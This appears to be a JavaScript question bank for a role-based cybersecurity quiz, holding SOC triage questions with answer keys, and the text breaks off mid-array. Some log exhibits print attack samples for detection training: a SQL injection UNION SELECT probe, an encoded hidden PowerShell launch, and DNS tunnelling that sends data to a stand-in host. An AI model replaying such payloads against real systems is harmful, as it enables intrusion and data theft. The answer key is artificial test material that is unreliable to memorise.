/*
 * CyberQuiz question bank - role-based edition (1000 questions)
 *
 * Required properties:
 * id, rank, role, topic, difficulty, q, options,
 * correct, why, hint
 *
 * Optional:
 * exhibit (plain text with line breaks: an email, message headers,
 * log excerpt, configuration, code or command output that the
 * question refers to; shown above or beside the question text)
 *
 * Roles (200 questions each):
 * const CAREER_ROLES = ['soc','pentest','grc','security-engineering','cloud-security'];
 *
 * Rank levels (40 questions per role per rank, 200 per rank overall):
 * 0 = Associate     1 = Professional   2 = Practitioner
 * 3 = Architect     4 = Expert
 * Total: 5 roles x 5 ranks x 40 questions = 1000 questions
 *
 * Ids: role-major in blocks of 200 (soc 1-200, pentest 201-400,
 * grc 401-600, security-engineering 601-800, cloud-security 801-1000);
 * inside each role the ranks run 0 to 4 in blocks of 40.
 *
 * Question types: single-answer questions and "best answer" questions.
 * In the 147 best-answer questions (all marked BEST in q) two options are
 * defensible and only one is the BEST choice for the scenario; the
 * explanation (why) names the runner-up and says why it is weaker.
 *
 * Exhibits: 154 questions include an exhibit (logs, configurations,
 * policies, reports, tables and command output).
 *
 * Pentest note: questions for the pentest role cover scoping, rules of
 * engagement, reporting, risk rating, remediation and validation of
 * findings, and detection and governance; they contain no exploitation
 * procedures.
 *
 * Correct-answer positions are balanced: A=250, B=250, C=250, D=250
 * overall, and 10 of each letter in every role and rank group of 40.
 *
 * Answer-length balance: in each role-rank group of 40 the correct option
 * is the longest in about a quarter of questions and the shortest in about
 * a quarter, so no consistent length pattern identifies it.
 */

window.CYBERQUIZ_QUESTIONS = [
  {
    id: 1, rank: 0, role: "soc", topic: "Alert Versus Incident", difficulty: "BEGINNER",
    q: "In a SOC, what is the difference between an alert and an incident?",
    options: ["An alert is a signal to check, an incident is confirmed harm","They mean the same thing, and are used in the same way in every SOC","An alert is written by management, while an incident is a report written by the software vendor","An alert is always a confirmed attack, while an incident is only a user complaint about slow systems"],
    correct: 0, why: "Alerts are signals that may or may not be real; an incident is confirmed or strongly suspected harm that needs a response process.",
    hint: "Signal versus confirmed event."
  },
  {
    id: 2, rank: 0, role: "soc", topic: "False Positive Meaning", difficulty: "BEGINNER",
    q: "An alert fires for an authorised nightly backup that copies many files. What is this alert called?",
    options: ["A true positive, as the copying really happened, and it needs escalation","A zero-day, as nobody had seen the pattern before","A false positive, and the rule needs tuning","A false negative, as the backup was missed"],
    correct: 2, why: "The rule fired on benign activity, which is a false positive; it should be tuned rather than ignored.",
    hint: "The rule fired, but nothing was wrong."
  },
  {
    id: 3, rank: 0, role: "soc", topic: "Failed Logon Burst", difficulty: "BEGINNER",
    exhibit: "2026-03-02 09:14:01 FAIL user=alice src=203.0.113.50\n2026-03-02 09:14:03 FAIL user=bob src=203.0.113.50\n2026-03-02 09:14:05 FAIL user=carol src=203.0.113.50\n2026-03-02 09:14:07 FAIL user=dave src=203.0.113.50\n2026-03-02 09:14:09 FAIL user=erin src=203.0.113.50",
    q: "Which conclusion best fits this authentication log extract?",
    options: ["Routine renewal of service account credentials by the identity team","Possible password spraying from one source, in most cases","A successful brute force of one administrator account","A single user who forgot their password after a holiday, and is retrying"],
    correct: 1, why: "One source tried failed logons across many different accounts in seconds, which is a spraying pattern rather than a forgotten password.",
    hint: "Many accounts, one source."
  },
  {
    id: 4, rank: 0, role: "soc", topic: "Reporting a Suspicious Email", difficulty: "BEGINNER",
    q: "A user forwards a suspicious email to the SOC. What should the analyst do first?",
    options: ["Reply to the sender, and ask whether the email is genuine","Open the attachment on a normal laptop to see what it does","Check the headers, links and attachment safely and see who else received it","Delete the email and close the ticket without a reply, then record the result in the ticket"],
    correct: 2, why: "Safe analysis and checking for other recipients scopes the campaign; opening attachments on a normal laptop or replying exposes the analyst.",
    hint: "Analyse safely and scope."
  },
  {
    id: 5, rank: 0, role: "soc", topic: "Time Synchronisation", difficulty: "BEGINNER",
    q: "Why must log sources use synchronised clocks?",
    options: ["So that logs take less disk space on every server, and in every backup","So that nightly backups run faster, and finish before the working day","So that events can be put in order across systems, during an investigation","So that users see the same wallpaper on every company computer"],
    correct: 2, why: "Correlating events across systems depends on consistent timestamps, so NTP is a basic logging requirement.",
    hint: "Ordering events."
  },
  {
    id: 6, rank: 0, role: "soc", topic: "Alert Priority", difficulty: "BEGINNER",
    q: "Two alerts arrive together: malware detected on a finance server and a blocked port scan from the internet. Which comes first?",
    options: ["Neither of them, as both were handled by automatic tools","The malware detection on the finance server","The blocked scan, as it arrived first and the queue works in order","Whichever alert has the shorter text, and is quicker to close"],
    correct: 1, why: "A detection on a business-critical internal server suggests something already got in, while a blocked scan is routine noise.",
    hint: "Inside beats outside."
  },
  {
    id: 7, rank: 0, role: "soc", topic: "Escalation Trigger", difficulty: "BEGINNER",
    q: "An analyst sees a domain admin account signing in from a new country at 3 a.m. What is the BEST action?",
    options: ["Close the alert as a likely holiday sign-in by the administrator","Email the admin, and wait for a reply before doing anything else","Add a note to the ticket, and review it again tomorrow morning","Escalate to the incident lead and start containing the account"],
    correct: 3, why: "Waiting for the admin to answer is the runner-up and gives context, but a privileged account in a new country is high risk, so escalate and contain first.",
    hint: "Privileged and unusual."
  },
  {
    id: 8, rank: 0, role: "soc", topic: "Beaconing Pattern", difficulty: "BEGINNER",
    q: "Which network pattern most suggests malware calling home at fixed intervals?",
    options: ["A large download from a software vendor during the monthly patch cycle","A short burst of traffic when staff open the morning email","A video conference with several participants at noon","Small outbound connections to one address at regular intervals"],
    correct: 3, why: "Small, regular, repeated outbound connections to one destination are typical beaconing behaviour.",
    hint: "Regular timing."
  },
  {
    id: 9, rank: 0, role: "soc", topic: "Handling Sensitive Samples", difficulty: "BEGINNER",
    q: "An analyst wants to check a suspicious file that came from a customer. What is the BEST approach?",
    options: ["Look up its hash, then use an internal sandbox for more detail","Open it on a normal laptop, as that is the quickest way to learn more","Upload the whole file to a public service, and anyone can analyse it","Ask the customer to run it and describe what happens on screen"],
    correct: 0, why: "A hash lookup is the runner-up as it is quick, but it reveals nothing about the content; public uploads can leak customer data, so an internal sandbox is the safer next step.",
    hint: "Do not leak the file."
  },
  {
    id: 10, rank: 0, role: "soc", topic: "Isolating a Host", difficulty: "BEGINNER",
    q: "EDR shows ransomware activity on a laptop. What is the best immediate action?",
    options: ["Let the user keep working while the SOC watches for more activity, where that is practical","Switch the laptop off, and put it away in a cupboard until next week","Isolate the host in the EDR console, and tell the incident lead","Wipe it and reinstall the system before anyone has looked at it"],
    correct: 2, why: "Isolation stops spread while keeping memory and disk evidence available; wiping destroys evidence.",
    hint: "Stop spread, keep evidence."
  },
  {
    id: 11, rank: 0, role: "soc", topic: "Log Retention Purpose", difficulty: "BEGINNER",
    q: "Why do SOC teams keep logs for a defined retention period?",
    options: ["To allow investigations of past events and meet legal needs, as a general rule","To speed up the deletion of old logs from the storage platform, as a general rule","To measure the time analysts spend on each ticket they handle, as a general rule","To replace the need for taking a backup of the affected system"],
    correct: 0, why: "Retention lets analysts look back over past activity and satisfies legal and audit requirements.",
    hint: "Look back."
  },
  {
    id: 12, rank: 0, role: "soc", topic: "Event 4625", difficulty: "BEGINNER",
    exhibit: "EventID: 4625\nAccount: svc-backup\nLogon Type: 3\nSource Network Address: 198.51.100.23\nFailure Reason: Unknown user name or bad password",
    q: "What does this Windows event record indicate?",
    options: ["A failed logon attempt for the named account","A successful logon by an administrator from another network","A password change made by the helpdesk for a locked-out user","A user logging off cleanly at the end of their working day"],
    correct: 0, why: "Event ID 4625 is a failed logon; the logon type and source address help decide whether it is an attack or a typo.",
    hint: "4625 is a failure."
  },
  {
    id: 13, rank: 0, role: "soc", topic: "DNS Query Review", difficulty: "BEGINNER",
    q: "Which DNS log entry is the most suspicious for a normal office workstation?",
    options: ["A query for a well known software update site","A long random subdomain of a newly registered domain","A query for the company's own mail server","A query for the internal file server"],
    correct: 1, why: "Long random subdomains on young domains are typical of DNS tunnelling or malware command channels.",
    hint: "Long and random."
  },
  {
    id: 14, rank: 0, role: "soc", topic: "Shift Handover", difficulty: "BEGINNER",
    q: "What should a good SOC shift handover contain?",
    options: ["Personal opinions about colleagues, and which analysts worked slowly","Open incidents, status and pending actions","Only the number of tickets closed during the shift, and the time each took, in most cases","Nothing, as the ticketing system keeps a full history of every shift"],
    correct: 1, why: "Handover keeps ongoing work from being dropped, so open items, status and next steps must be passed on clearly.",
    hint: "Do not drop open work."
  },
  {
    id: 15, rank: 0, role: "soc", topic: "Ticket Quality", difficulty: "BEGINNER",
    q: "Which ticket note is the most useful for the next analyst?",
    options: ["Ran some tools and found nothing of interest in the output","Host, time, evidence reviewed, action taken and the reason","Checked it, looks fine to me and nothing else needs to be done","Spoke to the user, and they said everything was fine today"],
    correct: 1, why: "Notes should be specific and repeatable so another analyst can follow or challenge the decision.",
    hint: "Specific and repeatable."
  },
  {
    id: 16, rank: 0, role: "soc", topic: "USB Malware", difficulty: "BEGINNER",
    q: "A user plugged in a USB stick found in the car park and the antivirus then alerted. What is the best response?",
    options: ["Wait, and see whether the antivirus alerts again later in the day, then record the result in the ticket","Format the USB stick, and give it back to the user to reuse","Tell the user to ignore the alert, as the stick has been removed","Isolate the machine and investigate what ran, in the first instance"],
    correct: 3, why: "Removing the stick does not remove anything that already executed, so contain the host and check what ran.",
    hint: "The stick was already used."
  },
  {
    id: 17, rank: 0, role: "soc", topic: "Reading Email Headers", difficulty: "BEGINNER",
    exhibit: "From: \"Payroll\" <payroll@contoso-hr.com>\nReturn-Path: <bounce@mail-relay.example.net>\nReceived-SPF: fail (domain of contoso-hr.com does not designate 192.0.2.77)\nSubject: Update your bank details\nMessage-ID: <8231@mail-relay.example.net>",
    q: "In these headers, which detail best suggests the sender is spoofed?",
    options: ["The email contains a subject line asking for updated bank details","The recipient address appears in the To field of the message","Return-Path differs from From and SPF failed","The message has a Message-ID value generated by the sending server"],
    correct: 2, why: "SPF failure with a mismatched Return-Path suggests the sending server was not authorised for the visible domain.",
    hint: "Look at SPF and Return-Path."
  },
  {
    id: 18, rank: 0, role: "soc", topic: "True and False Negative", difficulty: "BEGINNER",
    q: "An attack happens, but no alert fires. How is this outcome described?",
    options: ["A true positive, as the attack was found and stopped in time","A true negative, as no alert was generated in the system","A false positive, as the system raised an alarm for nothing","A false negative, meaning a detection gap"],
    correct: 3, why: "A real malicious event that is missed is a false negative and points to a detection gap.",
    hint: "Missed attack."
  },
  {
    id: 19, rank: 0, role: "soc", topic: "Normal Baseline", difficulty: "BEGINNER",
    q: "Why do analysts learn what normal looks like for their network?",
    options: ["So that they can switch off most alerts, and save time every week","So that attackers cannot see how the network is arranged","So that unusual behaviour stands out","So that they never need to use a ticketing system again"],
    correct: 2, why: "Detection and triage depend on recognising deviations from known normal behaviour.",
    hint: "Normal first."
  },
  {
    id: 20, rank: 0, role: "soc", topic: "ATT&CK Purpose", difficulty: "BEGINNER",
    q: "What is the MITRE ATT&CK framework mainly used for?",
    options: ["Scoring the performance of individual SOC staff members","Describing attacker tactics and techniques in a common language","Replacing the need for a firewall on the network edge","Encrypting data in transit between two servers"],
    correct: 1, why: "ATT&CK is a knowledge base of adversary behaviour used to map detections, hunts and reports.",
    hint: "Common language for behaviour."
  },
  {
    id: 21, rank: 0, role: "soc", topic: "Incident Impact Types", difficulty: "BEGINNER",
    q: "Customer records are copied by an attacker. Which part of the CIA triad is mainly affected?",
    options: ["Confidentiality","Non-repudiation, as the customers cannot deny having sent them","Availability, as the records can no longer be used by the customers","Integrity, as the stored records were silently changed by the attacker"],
    correct: 0, why: "Unauthorised copying of data is a loss of confidentiality, even though the data is still there.",
    hint: "Who can see it."
  },
  {
    id: 22, rank: 0, role: "soc", topic: "Ransomware First Actions", difficulty: "BEGINNER",
    q: "Several file servers show encrypted files and a ransom note. What is the BEST first priority?",
    options: ["Pay the ransom quickly to stop the countdown timer","Delete the ransom note, and users are not alarmed","Reboot every server, and the malware is cleared from memory","Contain affected systems and protect backups, then inform the incident lead"],
    correct: 3, why: "Paying is the runner-up some leaders ask about, but it is not a first step; containment and backup protection limit damage and keep options open.",
    hint: "Stop spread, keep backups."
  },
  {
    id: 23, rank: 0, role: "soc", topic: "Traffic Light Protocol", difficulty: "BEGINNER",
    q: "A report is marked TLP:AMBER. How should it be handled?",
    options: ["Share only with those who need it, as soon as practical","Publish it on social media, and everyone can benefit from it","Print it, and leave a copy in the reception area","Send it to every customer in the monthly newsletter, until the next scheduled review takes place"],
    correct: 0, why: "TLP marks how far information may be shared; AMBER limits it to people who need it.",
    hint: "Marking limits sharing."
  },
  {
    id: 24, rank: 0, role: "soc", topic: "Log Retention Reason", difficulty: "BEGINNER",
    q: "Why do organisations keep logs for months rather than days?",
    options: ["Auditors prefer large archives over short, and focused documents","Attackers always delete their own logs after exactly seven days","To use up spare disk space that was bought for other projects","Many intrusions are found long after they begin"],
    correct: 3, why: "Dwell time can be weeks or months, so older logs are needed to trace how and when an intrusion started.",
    hint: "Late discovery needs history."
  },
  {
    id: 25, rank: 0, role: "soc", topic: "IP Reputation Use", difficulty: "BEGINNER",
    q: "An analyst looks up an IP address in a reputation service and finds no reports. What is the safest conclusion?",
    options: ["It is not proof the IP is safe, so other evidence must be checked","The IP can never be used for attacks in the future","The IP belongs to the company, as the service has no reports","The IP is definitely safe, and the alert can be closed straight away"],
    correct: 0, why: "Absence of reports only means it has not been reported yet; new infrastructure is often clean at first.",
    hint: "No reports is not proof."
  },
  {
    id: 26, rank: 0, role: "soc", topic: "Internal Scanner Alerts", difficulty: "BEGINNER",
    q: "An alert shows port scanning from an internal host owned by the vulnerability scanning team. What should the analyst do?",
    options: ["Confirm it matches the schedule and document it","Delete the scanner's logs to keep the SIEM tidy","Ignore every future alert from that host from now on","Block the scanning team's whole network segment permanently"],
    correct: 0, why: "Authorised activity should still be verified against a schedule, then recorded, so unplanned scans are not missed.",
    hint: "Verify and document."
  },
  {
    id: 27, rank: 0, role: "soc", topic: "Proxy Log Reading", difficulty: "BEGINNER",
    exhibit: "10:00:01 GET http://intranet.corp/home 200 4120\n10:00:30 GET http://xk2v9.example-cdn.top/a.php?d=Zm9vYg== 200 64\n10:01:00 GET http://xk2v9.example-cdn.top/a.php?d=Zm9vYg== 200 64\n10:01:30 GET http://xk2v9.example-cdn.top/a.php?d=Zm9vYg== 200 64\n10:02:12 GET http://news.example.org/ 200 88211",
    q: "Which proxy log line deserves the closest attention?",
    options: ["A request to a well known news site","A request to the company intranet home page, as a general rule","A request to the vendor's software update server","Regular small requests to a rare domain with encoded data"],
    correct: 3, why: "Regular small beacons to a rare domain suggest command and control activity.",
    hint: "Regular beacons."
  },
  {
    id: 28, rank: 0, role: "soc", topic: "Spraying Versus Brute Force", difficulty: "BEGINNER",
    q: "What distinguishes password spraying from a classic brute force attack?",
    options: ["Spraying tries few passwords across many accounts, brute force tries many on one","They are the same technique and only the names differ","Spraying only works against printers and other network devices, wherever possible","Brute force never produces any failed logons in the logs"],
    correct: 0, why: "Spraying avoids lockouts by spreading attempts, so it shows many accounts with few failures each.",
    hint: "Wide versus deep."
  },
  {
    id: 29, rank: 0, role: "soc", topic: "Compromised Account Signs", difficulty: "BEGINNER",
    q: "Which sign most strongly suggests a mailbox has been compromised?",
    options: ["The user sent an email at lunchtime","The mailbox is nearly full after months of use","A new hidden inbox rule forwarding mail outside","The user has changed their email signature"],
    correct: 2, why: "Hidden forwarding rules are a common attacker persistence technique after email account takeover.",
    hint: "Check the rules."
  },
  {
    id: 30, rank: 0, role: "soc", topic: "Playbook Purpose", difficulty: "BEGINNER",
    q: "What is the main purpose of an incident response playbook?",
    options: ["To store the backup tapes in a safe place, as a general rule","To give analysts consistent steps for a known incident type","To replace all human judgement during a live incident","To list every employee's phone number, and home address, as a general rule"],
    correct: 1, why: "Playbooks make responses repeatable and faster, with room for judgement where needed.",
    hint: "Consistent steps."
  },
  {
    id: 31, rank: 0, role: "soc", topic: "Large Copy to USB", difficulty: "BEGINNER",
    q: "A user in HR copies 4 GB of files to a personal USB drive just before resigning. What is the BEST first step?",
    options: ["Confront the user at their desk, and take the drive away","Preserve the logs and inform HR and the incident lead","Ignore it as the user is leaving the company in any case","Block the user's account without telling anyone else"],
    correct: 1, why: "Confronting is the runner-up because it feels direct, but it risks evidence and employment issues; preserve evidence and use the agreed process.",
    hint: "Evidence and process first."
  },
  {
    id: 32, rank: 0, role: "soc", topic: "Why Use UTC", difficulty: "BEGINNER",
    q: "Why do many SOCs record incident times in UTC?",
    options: ["It makes the stored logs smaller on disk","It is required by every antivirus product","It stops attackers from reading the logs","It avoids confusion between time zones and daylight saving changes"],
    correct: 3, why: "One shared time standard avoids errors when correlating events from different regions.",
    hint: "One clock for all."
  },
  {
    id: 33, rank: 0, role: "soc", topic: "Alert Fatigue", difficulty: "BEGINNER",
    q: "What is the most likely result of a SOC receiving thousands of low-quality alerts every day?",
    options: ["Backups run faster","Analysts miss real threats because they become used to noise","Attackers are automatically blocked","Detection quality improves on its own"],
    correct: 1, why: "Too many false alerts hide real ones, so tuning is part of keeping detection effective.",
    hint: "Noise hides signal."
  },
  {
    id: 34, rank: 0, role: "soc", topic: "Unexpected MFA Prompts", difficulty: "BEGINNER",
    q: "A user reports repeated MFA approval prompts they did not request. What is the BEST response?",
    options: ["Disable MFA for that user to avoid further confusion, where that is practical","Tell them to approve once, and the prompts stop","Tell them to deny, reset their credentials and check sign-in logs","Wait to see whether the prompts continue tomorrow"],
    correct: 2, why: "Waiting is the runner-up and costs nothing, but prompts mean someone already has the password, so reset and investigate.",
    hint: "Someone has the password."
  },
  {
    id: 35, rank: 0, role: "soc", topic: "Lateral Movement Meaning", difficulty: "BEGINNER",
    q: "What is lateral movement?",
    options: ["A backup being copied to a new site overnight","A user changing desks to sit closer to the team","A firewall rule being edited by an administrator","An attacker moving from one system to others inside a network"],
    correct: 3, why: "After the first foothold, attackers move between systems to find valuable data and higher privileges.",
    hint: "Hopping between hosts."
  },
  {
    id: 36, rank: 0, role: "soc", topic: "Port Scan Meaning", difficulty: "BEGINNER",
    q: "What does a port scan from an external address usually indicate?",
    options: ["A user is logging in remotely from home","The antivirus is updating","A backup is running","Someone is looking for open services"],
    correct: 3, why: "Port scans map exposed services and are common internet background activity as well as an early attack step.",
    hint: "Mapping services."
  },
  {
    id: 37, rank: 0, role: "soc", topic: "Detection Metric", difficulty: "BEGINNER",
    q: "What does mean time to detect (MTTD) measure?",
    options: ["The length of the training courses","The average time between an attack starting and the SOC noticing it","The number of staff working in the SOC","The time needed to buy new security tools"],
    correct: 1, why: "MTTD shows how quickly threats are noticed and is one of the key SOC performance indicators.",
    hint: "Start to noticed."
  },
  {
    id: 38, rank: 0, role: "soc", topic: "Blocked Versus Allowed", difficulty: "BEGINNER",
    exhibit: "14:02:11 DENY  tcp 203.0.113.9:44211 -> 10.0.0.5:22\n14:02:11 DENY  tcp 203.0.113.9:44212 -> 10.0.0.5:22\n... (4998 more DENY lines)\n14:09:48 ALLOW tcp 203.0.113.9:51877 -> 10.0.0.20:443",
    q: "A firewall log shows one external IP blocked thousands of times and then one allowed connection. What is the BEST conclusion?",
    options: ["Review the allowed connection first, as it may be what got through","Assume the allowed connection is a test by the network team","Block the IP for a day, and close the ticket, in the first instance","Ignore it, as thousands of blocks show the firewall works"],
    correct: 0, why: "Treating the blocks as success is the runner-up; the allowed event is where harm could have happened, so it needs checking.",
    hint: "Check what got through."
  },
  {
    id: 39, rank: 0, role: "soc", topic: "Data Source Value", difficulty: "BEGINNER",
    q: "Which log source is the most useful for spotting a user signing in from a new location?",
    options: ["Air conditioning, and server room logs","Printer toner, and paper usage logs","Identity provider sign-in logs","Building lift, and door entry logs"],
    correct: 2, why: "Sign-in logs record account, time, location and result, so they show unusual access.",
    hint: "Where identity is recorded."
  },
  {
    id: 40, rank: 0, role: "soc", topic: "Closing an Alert Safely", difficulty: "BEGINNER",
    q: "Before closing a true positive alert, what should an analyst make sure of?",
    options: ["The user has been told the attacker's name","The alert is deleted from the SIEM","The root cause, actions taken and lessons are recorded","The ticket has a long title"],
    correct: 2, why: "Complete records let others learn from the case and let detection engineers improve the rule.",
    hint: "Record what was done."
  },
  {
    id: 41, rank: 1, role: "soc", topic: "Encoded PowerShell Command", difficulty: "INTERMEDIATE",
    exhibit: "EventID 4688\nNewProcessName: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentProcessName: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\nCommandLine: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
    q: "Which conclusion is best supported by this process creation event?",
    options: ["A normal administrator ran a scheduled patch script from the management server","The user opened a spreadsheet, and Excel updated its own add-ins in the background","Word started PowerShell with an encoded command, a common malicious pattern","The command is harmless as PowerShell is a signed Microsoft binary"],
    correct: 2, why: "An Office process spawning hidden PowerShell with -enc is typical of macro malware delivery and should be investigated.",
    hint: "Parent and arguments both matter."
  },
  {
    id: 42, rank: 1, role: "soc", topic: "Kerberoasting Evidence", difficulty: "INTERMEDIATE",
    exhibit: "EventID 4769 Account: jdoe Service: MSSQLSvc/db01 TicketEncryptionType: 0x17\nEventID 4769 Account: jdoe Service: HTTP/intranet TicketEncryptionType: 0x17\nEventID 4769 Account: jdoe Service: CIFS/files01 TicketEncryptionType: 0x17\nEventID 4769 Account: jdoe Service: MSSQLSvc/db02 TicketEncryptionType: 0x17",
    q: "Which pattern in domain controller logs most strongly suggests Kerberoasting?",
    options: ["One user requesting many service tickets using RC4","A user changing their own password once during the working day","Many failed interactive logons to a single shared workstation overnight","A computer account renewing its machine certificate on schedule"],
    correct: 0, why: "Kerberoasting requests service tickets for many SPNs, often with RC4, so they can be cracked offline.",
    hint: "Many service tickets, weak cipher."
  },
  {
    id: 43, rank: 1, role: "soc", topic: "Tuning a Noisy Rule", difficulty: "INTERMEDIATE",
    q: "A detection for admin tool use produces 300 false positives a day from the patching server. What is the BEST tuning approach?",
    options: ["Raise the threshold, and high that only mass activity is detected","Add a narrow, documented exclusion for the patching host and account, as soon as practical","Disable the rule until the patching project has finished","Tell analysts to ignore alerts from that rule during working hours, until the next scheduled review takes place"],
    correct: 1, why: "Raising the threshold is the runner-up because it cuts volume, but it blinds the rule to real low-volume abuse; a narrow, reviewed exclusion keeps coverage.",
    hint: "Narrow and documented."
  },
  {
    id: 44, rank: 1, role: "soc", topic: "Sigma Rule Purpose", difficulty: "INTERMEDIATE",
    q: "What is the main advantage of writing detections as Sigma rules?",
    options: ["They are vendor neutral and convert to many SIEM languages","They remove the need for log collection from the endpoints","They guarantee that the rule produces no false positives at all","They run faster than any compiled code on every collector in the network"],
    correct: 0, why: "Sigma describes log-based detections in a generic format that converters turn into Splunk, KQL or other queries.",
    hint: "Write once, convert."
  },
  {
    id: 45, rank: 1, role: "soc", topic: "Reading a KQL Query", difficulty: "INTERMEDIATE",
    exhibit: "SigninLogs\n| where TimeGenerated > ago(1h) and ResultType != 0\n| summarize Failures=count() by UserPrincipalName, IPAddress\n| where Failures > 20",
    q: "What does this query return?",
    options: ["The number of users in each department that signed in this week","Every successful sign-in recorded across all applications during the previous day","All accounts whose passwords have expired, and need to be changed","Accounts with over 20 failed sign-ins from one IP in the last hour"],
    correct: 3, why: "The query filters failed sign-ins, groups by account and IP, and keeps groups above the threshold.",
    hint: "Read the where and summarize lines."
  },
  {
    id: 46, rank: 1, role: "soc", topic: "Beaconing Analysis", difficulty: "INTERMEDIATE",
    q: "Connections from one host to a rare external IP occur every 60 seconds with small constant payloads. What is the most likely explanation?",
    options: ["A user streaming a long training video from a public site","A large file download from the software vendor's mirror","A web page loading many images from a content network","Malware checking in with its command server"],
    correct: 3, why: "Fixed-interval small connections are typical of implants checking in with a server.",
    hint: "Regular timing is the clue."
  },
  {
    id: 47, rank: 1, role: "soc", topic: "Persistence by Scheduled Task", difficulty: "INTERMEDIATE",
    exhibit: "EventID 4698 TaskName: \\Updater TaskContent: <Exec><Command>C:\\Users\\Public\\Temp\\u.ps1</Command></Exec> SubjectUserName: helpdesk-tmp",
    q: "Which event best supports that an attacker created persistence on a server?",
    options: ["An odd account created a task running a script from a public folder","A scheduled task that runs the vendor's backup agent at night, as a general rule","An update to the monitoring agent installed by the platform team","The patching service restarting automatically after hours"],
    correct: 0, why: "Tasks launching scripts from writable user paths, created by unexpected accounts, are a standard persistence technique.",
    hint: "Odd creator, odd path."
  },
  {
    id: 48, rank: 1, role: "soc", topic: "Triage of EDR Detection", difficulty: "INTERMEDIATE",
    q: "EDR flags a credential dumping tool on a developer workstation. The developer says it was a security test. What is the BEST action?",
    options: ["Check the claim against approved test records and isolate meanwhile","Delete the tool, and tell the developer not to use it again","Accept the explanation, and close the alert as a test","Wait for the developer's manager to confirm next week"],
    correct: 0, why: "Accepting the claim is the runner-up because developers do run test tools, but a statement is not authorisation; verify records and contain meanwhile.",
    hint: "Verify, then decide."
  },
  {
    id: 49, rank: 1, role: "soc", topic: "Web Log SQL Injection", difficulty: "INTERMEDIATE",
    exhibit: "198.51.100.8 - - [02/Mar/2026:10:11:02] \"GET /product.php?id=5%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\" 200 5123",
    q: "What does this web server log line most likely show?",
    options: ["A normal product page visit by a customer","A SQL injection attempt on the id parameter","A health check from the load balancer","A file download by a registered customer"],
    correct: 1, why: "The encoded UNION SELECT in the parameter is a classic injection probe.",
    hint: "Decode the parameter."
  },
  {
    id: 50, rank: 1, role: "soc", topic: "RDP Brute Force Response", difficulty: "INTERMEDIATE",
    q: "Logs show thousands of failed RDP logons from the internet, then one success for an admin account. What is the best next step?",
    options: ["Raise the number of failed logons allowed before lockout","Wait for a second successful logon before deciding on action","Treat it as a compromise and isolate the host","Block the source IP address, and close the ticket as resolved"],
    correct: 2, why: "A success after a brute force burst means the attacker may already be in, so blocking the IP alone is not enough.",
    hint: "The success is the problem."
  },
  {
    id: 51, rank: 1, role: "soc", topic: "Phishing URL Analysis", difficulty: "INTERMEDIATE",
    q: "Which URL is most likely a credential harvesting page for a company that uses login.contoso.com?",
    options: ["https://login.contoso.com/signin?redirect=portal, in most cases","https://contoso.com/login/help/reset","https://www.contoso.com/about/careers","https://login.contoso.com.secure-check.example/signin"],
    correct: 3, why: "The real registrable domain is secure-check.example, with the company name placed in front to deceive readers.",
    hint: "Read the domain from the right."
  },
  {
    id: 52, rank: 1, role: "soc", topic: "SOAR Automation Risk", difficulty: "INTERMEDIATE",
    q: "A team wants SOAR to disable any account that triggers an impossible travel alert. What is the BEST view?",
    options: ["Avoid automation, as analysts are always more reliable","Automate fully, as response speed matters most","Automate with safeguards such as VPN exclusions and approval for admins","Disable accounts only after three alerts have been seen for the user"],
    correct: 2, why: "Avoiding automation is the runner-up because it prevents mistakes, but it is slow; guarded automation balances speed and business impact.",
    hint: "Automate with guard rails."
  },
  {
    id: 53, rank: 1, role: "soc", topic: "Linux Auth Log", difficulty: "INTERMEDIATE",
    exhibit: "Mar  2 03:12:44 web1 sshd[2210]: Failed password for root from 203.0.113.77 port 51822 ssh2\nMar  2 03:12:46 web1 sshd[2212]: Failed password for root from 203.0.113.77 port 51830 ssh2\nMar  2 03:12:49 web1 sshd[2215]: Failed password for root from 203.0.113.77 port 51841 ssh2\nMar  2 03:12:51 web1 sshd[2218]: Accepted password for root from 203.0.113.77 port 51850 ssh2",
    q: "What does this auth.log extract indicate?",
    options: ["A scheduled job ran under the root account, as a general rule","A user changed their own password successfully, in most cases","The system rebooted during a maintenance window, in most cases","Root was accepted after repeated failures from one address"],
    correct: 3, why: "The accepted root login after a burst of failures suggests the password was guessed.",
    hint: "Failures, then success."
  },
  {
    id: 54, rank: 1, role: "soc", topic: "Threat Intel Confidence", difficulty: "INTERMEDIATE",
    q: "A feed lists an IP as malicious with low confidence from an unknown source. How should it be used?",
    options: ["Ignored completely, as all feeds are unreliable","As proof in a legal case against the owner of the IP","As investigation context, not an automatic block","As the reason to block the whole range worldwide"],
    correct: 2, why: "Low-confidence intelligence supports hunting and enrichment but needs corroboration before action.",
    hint: "Use confidence to choose the action."
  },
  {
    id: 55, rank: 1, role: "soc", topic: "Detection Coverage Mapping", difficulty: "INTERMEDIATE",
    q: "What is the best use of mapping detections to ATT&CK techniques?",
    options: ["Proving to auditors that every attack is blocked","Scoring the monthly performance of individual analysts","Finding techniques that have no detection coverage","Reducing all of the log sources down to a single one"],
    correct: 2, why: "Coverage mapping highlights gaps so detection engineering can prioritise by risk.",
    hint: "Gaps, not scores."
  },
  {
    id: 56, rank: 1, role: "soc", topic: "Office Child Process", difficulty: "INTERMEDIATE",
    q: "Which alert is the most concerning?",
    options: ["Excel opening a CSV file saved on the local disk","Excel checking the vendor site for add-in updates","Excel launching cmd.exe, which starts curl to fetch a file, as a general rule","Excel saving a workbook to a department share"],
    correct: 2, why: "Office applications rarely launch shells that download content; this chain suggests macro or exploit execution.",
    hint: "Parent-child chain."
  },
  {
    id: 57, rank: 1, role: "soc", topic: "DNS Tunnelling Signals", difficulty: "INTERMEDIATE",
    exhibit: "10:21:01 q=aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Qgb2YgZGF0YQ.t.evil-dns.example A\n10:21:01 q=ZXhmaWx0cmF0aW9uIGNodW5rIDAwMDIgb2YgMDA0Mg.t.evil-dns.example A\n10:21:02 q=Y2h1bmsgMDAwMyBwYXlsb2FkIGlzIGVuY29kZWQ.t.evil-dns.example A",
    q: "Which feature of this DNS log best indicates tunnelling?",
    options: ["Queries for popular news sites during the lunch hour, in most cases","Long encoded subdomains at a high rate to one domain","Queries for the internal domain controller names","Queries with normal short host names for printers, as a general rule"],
    correct: 1, why: "Data hidden in subdomain labels produces long, high-entropy names sent repeatedly to one authoritative server.",
    hint: "Length, entropy and rate."
  },
  {
